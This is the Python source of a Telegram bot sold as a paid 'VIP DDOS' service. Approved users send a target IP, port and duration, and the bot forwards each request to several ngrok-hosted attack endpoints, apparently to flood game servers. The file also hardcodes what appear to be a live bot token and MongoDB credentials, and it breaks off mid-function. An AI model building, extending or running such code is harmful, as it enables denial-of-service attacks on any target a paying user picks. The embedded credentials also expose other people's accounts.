import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

# Global variables and configurations
loop = asyncio.get_event_loop()
TOKEN = '7530415462:AAEjRIWWBJBmcNerEpz1ZIcrtACf8EHFj0A'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002302588770
CHANNEL_ID = -1002302588770
error_channel_id = -1002302588770

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# MongoDB Client
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['rishi']
users_collection = db.users

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Constants
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]


# Function to run attack commands asynchronously
async def run_attack_command_async(target_ip, target_port, duration):
    files = [
        "api.txt", "api1.txt", "api2.txt", "api3.txt",
        "api4.txt", "api5.txt",
    ]
    for current_file in files:
        try:
            with open(current_file, "r") as file:
                ngrok_url = file.read().strip()
            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}"
            headers = {"ngrok-skip-browser-warning": "any_value"}
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                logging.info(f"Attack command sent successfully: {url}")
                logging.info(f"Response: {response.json()}")
            else:
                logging.error(f"Failed to send attack command. Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        except Exception as e:
            logging.error(f"Failed to execute command with {current_file}: {e}")


# Function to start an asyncio loop
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


# Check if the user is approved
def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False


# Send a "not approved" message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval*", parse_mode='Markdown')


# Approve or disapprove users
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()
    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return
    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return
    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    if action == '/approve':
        if plan == 1 and users_collection.count_documents({"plan": 1}) >= 99:
            bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
            return
        if plan == 2 and users_collection.count_documents({"plan": 2}) >= 499:
            bot.send_message(chat_id, "*Approval failed: Attack limit reached (499 users).*", parse_mode='Markdown')
            return
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*✅ User {target_user_id} approved for {plan} days *"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved*"
    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')


# Process the attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return
    try:
        bot.send_message(chat_id, "*Please provide the details for the attack in the following format:\n\n<ip> <port> <time>*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")


# Handle the attack command details
def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid Format\n\nUse <IP> <PORT> <TIME>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        username = message.from_user.username
        bot.send_message(message.chat.id, f"*🚀 Attack Sent Successfully! 🚀\n\nTarget: {target_ip}:{target_port}\nTime: {duration} seconds\nAttacker Name: {username}*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")


# Check if a user is an admin
def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False


# Asyncio thread starter
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())


# Welcome message and default commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = KeyboardButton("Attack 🚀")
    btn2 = KeyboardButton("My Info ℹ️")
    btn3 = KeyboardButton("Buy Access! 💰")
    btn4 = KeyboardButton("Rules 🔰")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "*🔆 WELCOME TO VIP DDOS BOT 🔆*", reply_markup=markup, parse_mode='Markdown')


# Handle all messages
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return
    if message.text == "Buy Access! 💰":
        bot.reply_to(message, "*𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘\n\n[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n> DAY - 150 INR\n> WEEK - 700 INR\n\n[𝗣𝗹𝗮𝘁𝗶𝗻𝘂𝗺]\n> MONTH - 1600 INR\n\nDM TO BUY *", parse_mode='Markdown')
    elif message.text == "Attack 🚀":
        attack_command(message)
    elif message.text == "Rules 🔰":
        bot.send_message(message.chat.id, "*🔆 𝐕𝐈𝐏 𝐃𝐃𝐎𝗦 𝐑𝐔𝐋𝐄𝐒 🔆\n\n1. Follow all rules to avoid a ban.*", parse_mode='Markdown')
    elif message.text == "My Info ℹ️":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            user_id = message.from_user.id
            plan = user_data